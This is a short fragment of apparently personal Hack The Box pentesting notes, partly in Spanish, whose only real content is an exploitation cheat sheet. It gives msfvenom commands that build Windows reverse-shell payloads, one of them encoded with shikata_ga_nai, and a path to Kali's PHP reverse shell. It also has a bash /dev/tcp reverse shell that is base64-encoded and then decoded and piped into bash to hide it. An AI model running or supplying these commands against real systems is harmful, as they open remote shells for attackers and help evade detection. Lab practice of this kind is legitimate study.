
## DESCRIPTION



#### Mas información


## EXPLOITATION

 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.8 LPORT=443 -f exe -o shell.exe                     


BUILD A PAYLOAD REVERSE SHELL:

• Reverse Shell Path on Kali: usr/share/webshells/php/php-reverse-shell.php
```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.22 LPORT=443 -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai -f c --smallest
```

SEND REVERSE SHELL ENCODE WITH BASE64:
         • Crear: echo "bash -i >& /dev/tcp/10.10.14.38/1234 0>&1" | base64
         • Ejecutar con echo: echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4zOC8xMjM0IDA+JjEK | base64 -d | bash
## MACHINES

* Hack The Box: 

**!!NOTA IMPORTANTE!!** 